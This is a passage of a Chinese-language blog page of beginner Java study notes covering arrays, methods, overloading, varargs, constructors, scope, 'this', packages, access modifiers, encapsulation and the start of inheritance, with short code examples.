class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=arr.length-<span class="hljs-number">1</span>;i&gt;=<span class="hljs-number">0</span>;i--)&#123;<br>            System.out.println(arr[i]);<br>        &#125;<br><span class="hljs-comment">//求均值</span><br>        <span class="hljs-type">int</span> sum=arr[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;arr.length;i++)&#123;<br>            sum +=arr[i];<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;均值&quot;</span>+sum/arr.length);<br><span class="hljs-comment">//求最大值及其索引</span><br>        <span class="hljs-type">int</span> max=arr[<span class="hljs-number">0</span>];<br>        <span class="hljs-type">int</span> maxIndex=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;arr.length;i++)&#123;<br>            <span class="hljs-keyword">if</span>(max&lt;arr[i])&#123;<br>                max=arr[i];<br>                maxIndex=i;<br>            &#125;<br>        &#125;<br>        System.out.println(max+<span class="hljs-string">&quot; &quot;</span>+maxIndex);<br></code></pre></td></tr></table></figure><h3 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> a=<span class="hljs-number">164</span>;<br>      StringBuilder stringBuilder=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>      <span class="hljs-type">char</span>[] chars=&#123;<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;7&#x27;</span>,<span class="hljs-string">&#x27;8&#x27;</span>,<span class="hljs-string">&#x27;9&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-string">&#x27;C&#x27;</span>,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-string">&#x27;E&#x27;</span>,<span class="hljs-string">&#x27;F&#x27;</span>&#125;;<br>      <span class="hljs-keyword">while</span>(a&gt;<span class="hljs-number">0</span>)&#123;<br>          <span class="hljs-type">int</span> index=a%<span class="hljs-number">16</span>;<br>          <span class="hljs-type">char</span> temp=chars[index];<br>          stringBuilder.append(temp);<br>          a=a/<span class="hljs-number">16</span>;<br>      &#125;<br>      System.out.println(stringBuilder.reverse().toString());<br><br></code></pre></td></tr></table></figure><h1 id="类、属性、对象"><a href="#类、属性、对象" class="headerlink" title="类、属性、对象"></a>类、属性、对象</h1><h2 id="类的定义方法"><a href="#类的定义方法" class="headerlink" title="类的定义方法"></a>类的定义方法</h2><h3 id="方法（函数-成员方法-method-）的定义"><a href="#方法（函数-成员方法-method-）的定义" class="headerlink" title="方法（函数&#x2F;成员方法&#x2F; method ）的定义"></a>方法（函数&#x2F;成员方法&#x2F; method ）的定义</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java">访问修饰符 返回值类型 方法名（形参列表）&#123;<br>语句；<br>...<br><span class="hljs-keyword">return</span> 返回值；<br>&#125;<br>e.g.<br><span class="hljs-keyword">void</span> <span class="hljs-title function_">butt3rf1y</span><span class="hljs-params">()</span>&#123;...&#125;<br><span class="hljs-comment">//可以类比C语言的函数定义</span><br><br>类内部调用<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br> test();<br> &#125;<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span> &#123;<br>System.out.println(<span class="hljs-string">&quot;test&quot;</span>);<br> &#125;<br>&#125;<br><br>类外部调用<br>Main.java<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>Cat cat=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>();<br> cat.miao();<br> &#125;<br>&#125;<br>Cat.java<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span> &#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">miao</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;喵&quot;</span>);<br>        <span class="hljs-keyword">return</span>；（可以省略）<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p>一个方法只能返回一个值，要返回多个值可以用数组，可以为任意类型，包括基本数据类型和引用类型，<strong>返回值类型必须和 return 的值类型一致或兼容</strong></p><p>当函数没有返回值时，return 可以省略</p><h3 id="参数（类比C语言）"><a href="#参数（类比C语言）" class="headerlink" title="参数（类比C语言）"></a>参数（类比C语言）</h3><p>一个方法可以没有参数或多个参数，中间用逗号隔开（类比C语言）</p><h3 id="方法体"><a href="#方法体" class="headerlink" title="方法体"></a>方法体</h3><p>类比C语言函数体</p><p><strong>不可以在方法体内部定义方法</strong></p><h3 id="方法传参机制"><a href="#方法传参机制" class="headerlink" title="方法传参机制"></a>方法传参机制</h3><p><strong>a.方法嵌套顺序</strong></p><p>执行方法时会独立开辟栈空间,执行完毕或执行到 return 时，就会返回到调用方法的地方，返回后继续执行后面的代码，main 方法执行完毕，程序结束</p><p><strong>b.值传递&#x2F;值拷贝，形参任何改变不影响实参</strong></p><p><strong>c.引用传递，传递地址，形参改变可能影响实参</strong></p><p><strong>d.String 的传递</strong></p><h2 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h2><p>属性（成员变量&#x2F;字段&#x2F; field ）的概念</p><p>属性定义语法与变量一致，多了访问修饰符</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">访问修饰符 属性类型 属性名<br></code></pre></td></tr></table></figure><p>属性类型可以为任意类型，可以是基本数据类型和引用类型，如果没有初始化，有默认值，和数组一致</p><h3 id="Static"><a href="#Static" class="headerlink" title="Static"></a>Static</h3><h4 id="静态属性（类属性）与实例属性（对象属性）"><a href="#静态属性（类属性）与实例属性（对象属性）" class="headerlink" title="静态属性（类属性）与实例属性（对象属性）"></a>静态属性（类属性）与实例属性（对象属性）</h4><p>静态属性，只有一份，可以通过 <strong>类名.属性名&#x2F;对象.属性名</strong>来赋值和访问</p><p>实例属性，每个对象有一份，只能通过 <strong>对象.属性名</strong>来赋值和访问</p><h4 id="静态方法和实例方法（对象方法）"><a href="#静态方法和实例方法（对象方法）" class="headerlink" title="静态方法和实例方法（对象方法）"></a>静态方法和实例方法（对象方法）</h4><p>静态方法只能调用静态方法，不能访问实例属性</p><p>实例方法中可以调用静态方法和实例方法，也可以访问静态属性和实例属性</p><h4 id="补全method方法"><a href="#补全method方法" class="headerlink" title="补全method方法"></a>补全method方法</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(method(method(<span class="hljs-number">100.2</span>,<span class="hljs-number">1.0</span>),<span class="hljs-number">100</span>))<br><br><span class="hljs-keyword">static</span> <span class="hljs-type">double</span> <span class="hljs-title function_">method</span><span class="hljs-params">(<span class="hljs-type">double</span> a,<span class="hljs-type">double</span> b)</span>&#123;<br>  <span class="hljs-keyword">return</span> a+b;<br> &#125;<br></code></pre></td></tr></table></figure><p>e.g.</p><p>定义一个find方法，实现对字符串数组元素进行查找，并返回索引，找不到返回-1；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">String[] a=<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>,<span class="hljs-string">&quot;c&quot;</span>&#125;;<br>  String b=<span class="hljs-string">&quot;c&quot;</span>;<br>  System.out.println(find(a,b));<br>  <br> &#125;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">find</span><span class="hljs-params">(String[] a,String b)</span> &#123;<br>      <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; a.length; i++) &#123;<br>        <span class="hljs-keyword">if</span> (a[i] == b) &#123;<br>          <span class="hljs-keyword">return</span> i;<br>        &#125;<br>      &#125;<br>      <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><h1 id="重载"><a href="#重载" class="headerlink" title="重载"></a>重载</h1><p>同一个类中，允许存在一个以上的同名方法，只要它们的参数个数或者参数类型，参数顺序不同即可，<strong>与返回值类型无关</strong>，只看参数列表</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hello</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>       <br>        System.out.println(<span class="hljs-string">&quot;abc0&quot;</span>);<br>        System.out.println(<span class="hljs-string">&#x27;a&#x27;</span>);<br>        System.out.println(<span class="hljs-literal">false</span>);<br>        System.out.println(<span class="hljs-number">1000.1</span>);<br>        System.out.println(<span class="hljs-number">123</span>);<br>        test(<span class="hljs-string">&quot;x&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">(String a)</span>&#123;<br>        System.out.println(a);<br>    &#125;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span>&#123;<br>        System.out.println(a);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="可变参数"><a href="#可变参数" class="headerlink" title="可变参数"></a>可变参数</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">(<span class="hljs-type">int</span>... nums)</span>&#123; &#125;<br></code></pre></td></tr></table></figure><p>可变参数本质就是数组，实参可以为0个或任意多个</p><p>可变参数的实参可以为数组，这时候只能传一个参数</p><p>形参列表中只能出现一个可变参数</p><p>可变参数可以和普通参数以前放在形参列表，但必须保证可变参数在最后一个西餐列表中只能出现一个可变参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>       <br>       <span class="hljs-type">int</span>[] a=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>&#125;;<br>        System.out.println(sum(<span class="hljs-string">&quot;java&quot;</span>,<span class="hljs-string">&quot;cpp&quot;</span>,a));<br>    &#125;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">(String d,String b,<span class="hljs-type">int</span>... a)</span>&#123;<br>        <span class="hljs-type">int</span> result=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;a.length;i++)&#123;<br>            result+=a[i];<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br></code></pre></td></tr></table></figure><h1 id="构造器-构造方法-构造函数"><a href="#构造器-构造方法-构造函数" class="headerlink" title="构造器&#x2F;构造方法&#x2F;构造函数"></a>构造器&#x2F;构造方法&#x2F;构造函数</h1><h2 id="构造器特点"><a href="#构造器特点" class="headerlink" title="构造器特点"></a>构造器特点</h2><p>与类名一致，<strong>无返回值</strong>；</p><p>当对象创建时，会自动调用对应的构造器</p><p>如果没有定义构造器，会自动生成默认的无参构造器（默认构造器）</p><p>一个类可以定义多个不同的构造器，即构造器重载</p><p>一旦定义了构造器，默认的构造器就覆盖了，就不能再使用默认的无参构造器，除非自己显示的定义一下</p><h2 id="对象创建流程"><a href="#对象创建流程" class="headerlink" title="对象创建流程"></a>对象创建流程</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>&#123;<br>       <span class="hljs-type">int</span> age=<span class="hljs-number">90</span>;<br>       String name;<br>       Person(String n,<span class="hljs-type">int</span> a)&#123;<br>           name=n;<br>           age=a;<br>       &#125;<br>   &#125;<br>   Person p=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;abc&quot;</span>,<span class="hljs-number">31</span>);<br></code></pre></td></tr></table></figure><p>加载 Person 类信息，只会加载一次</p><p>在堆中分配空间（地址）</p><p>完成对象初始化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">默认初始化   age=<span class="hljs-number">0</span>   name=<span class="hljs-literal">null</span><br>显示初始化   age=<span class="hljs-number">90</span>   name=<span class="hljs-literal">null</span><br>构造器初始化   age=<span class="hljs-number">31</span>   name=abc<br></code></pre></td></tr></table></figure><p>在对象在堆中的地址，返回给 p (p是对象名，也可以理解成是对象的引用)</p><h1 id="变量作用域"><a href="#变量作用域" class="headerlink" title="变量作用域"></a>变量作用域</h1><h2 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h2><p>属性（成员变量），可以被本类或其他类使用</p><p>可以加访问修饰符</p><p>有默认值，可以不赋值直接使用</p><p>生命周期长，伴随着对象的创建而创建，销毁而销毁</p><h2 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h2><p>不可加修饰符</p><p>没有默认值，需要赋值使用</p><p>生命周期短，伴随代码块执行而创建，结束而销毁</p><h2 id="块级作用域"><a href="#块级作用域" class="headerlink" title="块级作用域"></a>块级作用域</h2><p><strong>static静态代码块（最先执行）</strong>、构造代码块、方法代码块、局部代码块、语句代码块</p><p><strong>属性和局部变量可以重名</strong>，优先使用局部变量，在<strong>同一个作用域中两个局部变量不能重名</strong></p><h1 id="this"><a href="#this" class="headerlink" title="this"></a>this</h1><ul><li><p>代表当前对象，打印对象的 hashCode，哪个对象调用方法，this 就指哪个对象</p></li><li><p>this 用于区分当前对象的属性和局部变量</p></li><li><p>this 不能在类外部使用，<strong>只能在类内部实例方法中使用</strong>，静态方法不可使用</p></li><li><p>类内部赋值和获取实例属性</p></li></ul><h2 id="类内部调用方法"><a href="#类内部调用方法" class="headerlink" title="类内部调用方法"></a>类内部调用方法</h2><p>方法名（实参列表）</p><p>​this.方法名（实参列表）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span>&#123;<br>      System.out.println(<span class="hljs-string">&quot;this:&quot;</span>+<span class="hljs-built_in">this</span>.hashCode());<br>  &#125;<br>  <span class="hljs-keyword">void</span> <span class="hljs-title function_">test1</span><span class="hljs-params">()</span>&#123;<br>      <span class="hljs-built_in">this</span>.test();<br>      System.out.println(<span class="hljs-string">&quot;this:&quot;</span>+<span class="hljs-built_in">this</span>.hashCode());<br>  &#125;<br> <br></code></pre></td></tr></table></figure><h2 id="this方法"><a href="#this方法" class="headerlink" title="this方法"></a>this方法</h2><p>this（实参列表）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">Cat</span><span class="hljs-params">(String name)</span>&#123;<br>       <span class="hljs-built_in">this</span>(name,<span class="hljs-number">30</span>);<span class="hljs-comment">//必须放在第一行才能使用</span><br>       <span class="hljs-built_in">this</span>.name=name;<br>       System.out.println(<span class="hljs-built_in">this</span>.name);<br>       System.out.println(<span class="hljs-string">&quot;this&quot;</span>+<span class="hljs-built_in">this</span>.hashCode());<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">Cat</span><span class="hljs-params">(String dname,<span class="hljs-type">int</span> age)</span>&#123;<br>       <span class="hljs-built_in">this</span>.age=age;<br>       System.out.println(<span class="hljs-string">&quot;Cat(String dname,int agr)&quot;</span>);<br>   &#125;<br></code></pre></td></tr></table></figure><h1 id="包"><a href="#包" class="headerlink" title="包"></a>包</h1><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>区分相同名字类，方便管理，控制访问范围</p><h2 id="建包"><a href="#建包" class="headerlink" title="建包"></a>建包</h2><p>建立不同的文件夹&#x2F;目录来保存类文件</p><h2 id="打包"><a href="#打包" class="headerlink" title="打包"></a>打包</h2><p>基本语法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.butterfly.app<br><span class="hljs-keyword">package</span> <span class="hljs-comment">//关键字</span><br>com.butterfly.app <span class="hljs-comment">//包名</span><br></code></pre></td></tr></table></figure><p>package 的作用是声明当前类所在的包，<strong>一个类只能有一个 package</strong></p><h2 id="导包"><a href="#导包" class="headerlink" title="导包"></a>导包</h2><p>import 指令位置放在 package 下，在类定义前面，可以有多句且没有顺序要求</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br>java.lang.*  是基本包，默认引入，不需要再引入<br></code></pre></td></tr></table></figure><h1 id="访问修饰符"><a href="#访问修饰符" class="headerlink" title="访问修饰符"></a>访问修饰符</h1><p>控制属性和方法的访问权限</p><p>修饰类的属性，成员方法及类</p><p>只有默认的和 public 才能修饰类，并且遵循上述访问权限的特点</p><table><thead><tr><th></th><th>本类</th><th>同包</th><th>子类</th><th>不同包</th></tr></thead><tbody><tr><td>public</td><td>√</td><td>√</td><td>√</td><td>√</td></tr><tr><td>protected</td><td>√</td><td>√</td><td>√</td><td>×</td></tr><tr><td>private</td><td>√</td><td>×</td><td>×</td><td>×</td></tr><tr><td>没有修饰符</td><td>√</td><td>√</td><td>×</td><td>×</td></tr></tbody></table><h1 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h1><p>把属性私有，定义公开的 get、set 方法来验证数据合理性</p><p>e.g</p><p>定义 Account 类，要求具有属性：姓名 name（长度为2-4，初始化后不可修改）、余额 balance（必须大于20）、密码 password（必须是六位）。如果不满足，则给出提示信息，并给默认值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs java">Account.java<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Account</span> &#123;<br>    <span class="hljs-keyword">private</span> String name=<span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> balance=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">private</span> String password=<span class="hljs-literal">null</span>;<br>    <br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-keyword">if</span>(name==<span class="hljs-literal">null</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;名字不能设置为null&quot;</span>);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">this</span>.name!=<span class="hljs-literal">null</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;名字只能修改一次&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (name.length() &lt; <span class="hljs-number">2</span> || name.length() &gt; <span class="hljs-number">4</span>) &#123;<br>                System.out.println(<span class="hljs-string">&quot;名字长度需要2-4位&quot;</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-built_in">this</span>.name = name;<br>            &#125;<br>        &#125;<br>       <br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getBalance</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> balance;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setBalance</span><span class="hljs-params">(<span class="hljs-type">double</span> balance)</span> &#123;<br>        <span class="hljs-keyword">if</span>(balance&lt;=<span class="hljs-number">20</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;余额必须大于20&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-built_in">this</span>.balance = balance;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getPassword</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> password;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPassword</span><span class="hljs-params">(String password)</span> &#123;<br>        <span class="hljs-keyword">if</span>(password==<span class="hljs-literal">null</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;password不能设置为null&quot;</span>);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(password.length()==<span class="hljs-number">6</span>)&#123;<br>            <span class="hljs-built_in">this</span>.password = password;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            System.out.println(<span class="hljs-string">&quot;密码必须是六位&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><br>Hello.java<br>Account account=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Account</span>();<br>        account.setName(<span class="hljs-string">&quot;null&quot;</span>);<br>        System.out.println(account.getName());<br>        account.setPassword(<span class="hljs-string">&quot;123456&quot;</span>);<br>        System.out.println(account.getPassword());<br><br></code></pre></td></tr></table></figure><h1 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h1><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scala"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">子类</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">父类</span></span>&#123;&#125;<br></code></pre></td></tr></table></figure><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scala"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Person</span></span>&#123;&#125;<br></code></pre></td></tr></table></figure><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>a.     父类&#x2F;超类&#x2F;基类</p><p>​子类&#x2F;派生类</p><p>b. 多个类存在相同的属性和方法时，从中抽象出父类，在父类中定义相同的属性和方法，所有子类不需要再重新定义，只需要通过 extends 声明继承父类就行</p><p>c. 子类自动拥有父类的所有属性和方法（受访问修饰符影响）</p><p>d. 子类不能访问父类的属性和方法，可以通过父类的公开方法去访问，类似封装</p><p>e. 单继承机制，子类最多只能继承一个父类（直接继承），但是可以实现多个接口</p><p>f. 所有类都是 Object 的子类</p><p>g. 多次继承 查看方法</p><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 